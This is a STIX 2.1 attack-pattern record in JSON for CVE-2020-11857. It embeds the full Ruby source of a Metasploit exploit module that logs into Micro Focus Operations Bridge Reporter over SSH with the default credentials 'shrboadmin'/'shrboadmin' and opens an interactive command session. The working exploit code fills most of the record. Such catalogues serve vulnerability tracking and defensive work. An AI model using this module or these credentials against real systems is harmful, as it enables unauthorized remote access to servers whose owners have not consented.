{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a8d36f8b-7758-44b5-9e3f-cf3a436dce51",
    "created": "2024-08-14T16:58:19.118122Z",
    "modified": "2024-08-14T16:58:19.118126Z",
    "name": "Micro Focus Operations Bridge Reporter shrboadmin default password",
    "description": " This module abuses a known default password on Micro Focus Operations Bridge Reporter. The 'shrboadmin' user, installed by default by the product has the password of 'shrboadmin' and allows an attacker to login to the server via SSH. This module has been tested with Micro Focus Operations Bridge Manager 10.40. Earlier versions are most likely affected too. Note that this is only exploitable in Linux installations.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/ssh/microfocus_obr_shrboadmin.rb",
            "external_id": "microfocus_obr_shrboadmin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11857"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBR.md"
        },
        {
            "source_name": "reference",
            "url": "https://softwaresupport.softwaregrp.com/doc/KM03710590"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SSH\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Micro Focus Operations Bridge Reporter shrboadmin default password',\n        'Description' => %q{\n          This module abuses a known default password on Micro Focus Operations Bridge Reporter.\n          The 'shrboadmin' user, installed by default by the product has the password of 'shrboadmin',\n          and allows an attacker to login to the server via SSH.\n          This module has been tested with Micro Focus Operations Bridge Manager 10.40. Earlier\n          versions are most likely affected too.\n          Note that this is only exploitable in Linux installations.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2020-11857' ],\n          [ 'ZDI', '20-1215' ],\n          [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/Micro_Focus/Micro_Focus_OBR.md' ],\n          [ 'URL', 'https://softwaresupport.softwaregrp.com/doc/KM03710590' ],\n        ],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Payload' => {\n          'Compat' => {\n            'PayloadType' => 'cmd_interact',\n            'ConnectionType' => 'find'\n          }\n        },\n        'Platform' => 'unix',\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          [ 'Micro Focus Operations Bridge Reporter (Linux) versions <= 10.40', {} ],\n        ],\n        'Privileged' => false,\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2020-09-21',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(22),\n        OptString.new('USERNAME', [true, 'Username to login with', 'shrboadmin']),\n        OptString.new('PASSWORD', [true, 'Password to login with', 'shrboadmin']),\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30])\n      ]\n    )\n  end\n\n  def rhost\n    datastore['RHOST']\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def do_login(user, pass)\n    opts = ssh_client_defaults.merge({\n      auth_methods: ['password', 'keyboard-interactive'],\n      port: rport,\n      password: pass\n    })\n\n    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']\n\n    begin\n      ssh = nil\n      ::Timeout.timeout(datastore['SSH_TIMEOUT']) do\n        ssh = Net::SSH.start(rhost, user, opts)\n      end\n    rescue Rex::ConnectionError\n      return\n    rescue Net::SSH::Disconnect, ::EOFError\n      print_error \"#{rhost}:#{rport} SSH - Disconnected during negotiation\"\n      return\n    rescue ::Timeout::Error\n      print_error \"#{rhost}:#{rport} SSH - Timed out during negotiation\"\n      return\n    rescue Net::SSH::AuthenticationFailed\n      print_error \"#{rhost}:#{rport} SSH - Failed authentication\"\n    rescue Net::SSH::Exception => e\n      print_error \"#{rhost}:#{rport} SSH Error: #{e.class} : #{e.message}\"\n      return\n    end\n\n    if ssh\n      conn = Net::SSH::CommandStream.new(ssh)\n      ssh = nil\n      return conn\n    end\n\n    return nil\n  end\n\n  def exploit\n    user = datastore['USERNAME']\n    pass = datastore['PASSWORD']\n\n    print_status(\"#{rhost}:#{rport} - Attempt to login to the server...\")\n    conn = do_login(user, pass)\n    if conn\n      print_good(\"#{rhost}:#{rport} - Login Successful (#{user}:#{pass})\")\n      handler(conn.lsock)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-09-21",
    "x_mitre_platforms": [
        "unix'"
    ]
}